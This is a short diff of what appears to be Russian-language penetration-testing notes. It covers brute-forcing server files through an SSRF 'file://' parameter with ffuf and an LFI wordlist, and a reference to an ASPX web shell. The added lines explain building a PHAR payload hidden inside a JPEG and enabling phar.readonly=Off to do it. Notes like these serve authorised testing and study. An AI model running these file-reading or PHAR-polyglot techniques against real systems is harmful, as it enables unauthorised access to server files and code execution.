@@ -166,3 +166,14 @@ https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
 # Брут файловой системы чере ssrf
 
 	ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018
+
+# JPG ---> PHAR
+
+	PHAR в картинке сгенерил с помощью https://github.com/Sarapuce/jpeg-phar-fusion
+ 	А в локальном php.ini написать
+	[phar]
+	phar.readonly = Off
+	Т.е. в файле phar_creator.py была строка "bash_command = "php phar_generator.php " + phar_payload", я её изменил на "bash_command = "php -c php.ini phar_generator.php " + phar_payload", вот что он показывает
+
+
+ 
